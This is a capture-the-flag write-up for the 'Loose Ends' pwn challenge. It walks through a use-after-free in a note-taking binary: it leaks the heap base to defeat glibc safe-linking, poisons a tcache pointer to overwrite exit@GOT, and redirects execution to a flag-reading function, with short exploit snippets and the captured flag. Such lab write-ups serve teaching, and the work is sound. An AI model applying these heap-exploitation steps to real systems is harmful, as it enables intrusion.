# Loose Ends — Pwn (Hard)

**Flag:** `H7CTF{4d0e9693-88bd-4749-87d8-c64dd2ef80ab}` · 248 pts · H7TEX 2026
**Target:** `pwn.h7tex.com:42589` · **Files:** `ledger.zip` → `ledger` (ELF x86-64), `libc.so.6` (glibc 2.39-0ubuntu8.9), `ld-linux-x86-64.so.2`

## Challenge

Sparrow Freight's ledger. The bookkeepers do not erase old entries as carefully as they think, and there is an audit
that reads out the day's pass code which nobody has ever called. Tie the loose ends together.

## Initial Analysis

```
ET_EXEC no PIE | NX on | canary present (menu/idx/audit)
GNU_RELRO 0x403df8..0x404000  ->  all function JUMP_SLOTs at 0x404000..0x404060 are still writable
```

`main` is a 4-choice menu over a global array of pointers:

```
notes[16] @ 0x4040a0
add    : notes[i] = malloc(0x50); read(0, notes[i], 0x50)
delete : free(notes[i])                      <- notes[i] is NOT set to NULL
edit   : if (notes[i]) read(0, notes[i], 0x50)
view   : if (notes[i]) write(1, notes[i], 0x50)
```

`delete` leaves the freed pointer in place, while `edit`/`view` only check that the pointer is non-NULL:
a use-after-free on both read and write.

`audit @ 0x4012b6` opens `/flag`, reads 80 bytes and then `printf("[audit] %s\n", ...)`. It is not in the menu's jump
table, so the only way to reach it is by jumping.

Two details make the challenge easier than expected. The heap is not randomised: the first allocation sits at
`0x4062b0`, right after BSS. RELRO ends at `0x404000`: the whole PLT GOT is writable, and with no PIE there is nothing
to leak at all.

## Exploit Chain

**Step 1 - Leak `heap >> 12` to beat safe-linking.** glibc 2.39 encrypts the tcache pointer:
`stored = (pos >> 12) ^ real`. When `free(A)` runs and A is the bin's last element, `real = NULL`, so A's first 8
bytes are exactly `A >> 12`.

```
add(0); add(1); delete(0); view(0)   ->  8 byte đầu = 06 04 00 ...  =>  t = 0x406
```

**Step 2 - Poison the fd.** `delete(1)` puts B at the head of the bin. `edit(1)` is a UAF write, overwriting
`B->next` itself:

```python
edit(1, p64(t ^ 0x404060))     # 0x404060 = exit@GOT
```

B and A are on the same page, so `B >> 12 == t`, and when `tcache_get` unmangles:
`(B>>12) ^ (t ^ 0x404060) = 0x404060`.

**Step 3 - Two allocations to capture the pointer.** `add(2)` pops B, `add(3)` pops `0x404060` →
`notes[3] = exit@GOT`. Verified with `view(3)`: the 80 bytes printed contain `0x7f91ca0054c0` / `0x7f91ca0048e0`
(stdout/stdin) and `0x4062b0` / `0x406310` (notes[0], notes[1]) exactly as laid out in BSS.

**Step 4 - Write `audit` into `exit@GOT`, then trigger it.**

```python
edit(3, p64(0x4012b6))     # read() only takes exactly the bytes sent -> only 8 bytes are written
shutdown(SHUT_WR)          # menu: fgets(stdin) trả NULL -> exit(0) -> jmp audit
```

Closing the socket's write direction makes `fgets` return NULL, the menu falls into `exit`, and `exit` is now
`0x4012b6`.

## Reproduce

```
python -u exploit.py pwn.h7tex.com 42589
```

`exploit.py` uses only `socket` + `struct`, and is self-generating with no libc leak needed.

## Flag
```
[audit] H7CTF{4d0e9693-88bd-4749-87d8-c64dd2ef80ab}
```
